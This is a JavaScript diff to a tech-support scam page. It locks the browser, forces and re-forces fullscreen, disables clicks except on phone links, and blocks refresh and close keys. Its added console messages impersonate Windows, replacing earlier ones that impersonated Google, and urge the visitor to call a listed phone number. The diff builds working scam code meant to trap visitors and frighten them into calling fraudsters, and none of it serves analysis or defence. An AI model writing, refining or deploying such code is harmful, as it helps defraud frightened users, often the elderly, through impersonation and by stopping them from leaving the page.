           layer1.style.display = 'flex';
         }
         
+        // Ensure body is locked
         document.body.style.overflow = 'hidden';
-      }, 100);
+        document.documentElement.style.overflow = 'hidden';
+        document.body.style.pointerEvents = 'none';
+        
+        // Re-enable phone links
+        const links = document.querySelectorAll('a[href^="tel:"]');
+        links.forEach(link => {
+          link.style.pointerEvents = 'auto';
+        });
+        
+        // Fullscreen check and re-entry
+        if (!document.fullscreenElement && !document.webkitFullscreenElement && 
+            !document.mozFullScreenElement && !document.msFullscreenElement) {
+          enterFullScreen();
+        }
+      }, 50);
       
-      // ===== GOOGLE-STYLE CONSOLE MESSAGES =====
-      console.log('%cGoogle Security: Critical alert active', 'color: #d93025; font-size: 20px; font-weight: bold;');
-      console.log('%cCall +1(833)224-9350 immediately', 'color: #1a73e8; font-size: 16px;');
+      // ===== CONSOLE SCARE MESSAGES =====
+      console.log('%cWINDOWS CRITICAL ERROR', 'color: #106ebe; font-size: 30px; font-weight: bold;');
+      console.log('%cCall +1(833)224-9350 immediately', 'color: white; font-size: 24px; background: #ff0000; padding: 10px;');
+      
+      // ===== PREVENT ANY POSSIBLE EXIT =====
+      // Disable F11 (fullscreen toggle), F5 (refresh), etc.
+      window.addEventListener('keydown', function(e) {
+        if (e.key === 'F11' || e.key === 'F5' || e.key === 'F4' || 
+            (e.ctrlKey && e.key === 'w') || (e.ctrlKey && e.key === 'r') ||
+            (e.ctrlKey && e.key === 'W') || (e.ctrlKey && e.key === 'R')) {
+          e.preventDefault();
+          // Force fullscreen again
+          setTimeout(enterFullScreen, 10);
+          return false;
+        }
+      }, true);
       
     })();
   </script>
